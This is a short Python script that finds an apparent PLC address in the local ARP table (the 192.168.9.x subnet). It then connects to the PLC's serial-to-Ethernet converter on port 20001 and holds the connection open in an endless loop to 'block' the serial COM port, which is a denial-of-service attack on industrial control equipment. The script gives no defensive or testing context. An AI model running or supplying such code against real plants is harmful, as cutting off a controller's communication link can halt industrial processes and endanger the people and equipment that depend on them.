import socket
import subprocess
import re

# Function to find the PLC's IP address
def find_plc_ip():
    # Run a command to get the ARP table (adjust for your OS)
    arp_output = subprocess.check_output(["arp", "-a"]).decode("utf-8")

    # Use regex to find the PLC's IP address (adjust based on your network)
    ip_pattern = re.compile(r"192\.168\.9\.\d+")  # Match the PLC's subnet
    matches = ip_pattern.findall(arp_output)

    if matches:
        return matches[0]  # Return the first match
    else:
        raise Exception("PLC IP address not found in ARP table.")

# Function to block the serial COM port
def block_serial_com(plc_ip, port):
    try:
        # Create a TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Set a timeout for the connection

        # Connect to the serial-to-Ethernet converter
        sock.connect((plc_ip, port))
        print(f"Successfully blocked serial COM port {port} on {plc_ip}.")

        # Keep the connection open indefinitely
        while True:
            pass

    except Exception as e:
        print(f"Failed to block serial COM port: {e}")
    finally:
        sock.close()

# Main script
if __name__ == "__main__":
    try:
        # Step 1: Find the PLC's IP address
        plc_ip = find_plc_ip()
        print(f"PLC IP address found: {plc_ip}")

        # Step 2: Block the serial COM port (e.g., port 20001 for COM1)
        serial_port = 20001  # Adjust based on your setup
        block_serial_com(plc_ip, serial_port)

    except Exception as e:
        print(f"An error occurred: {e}")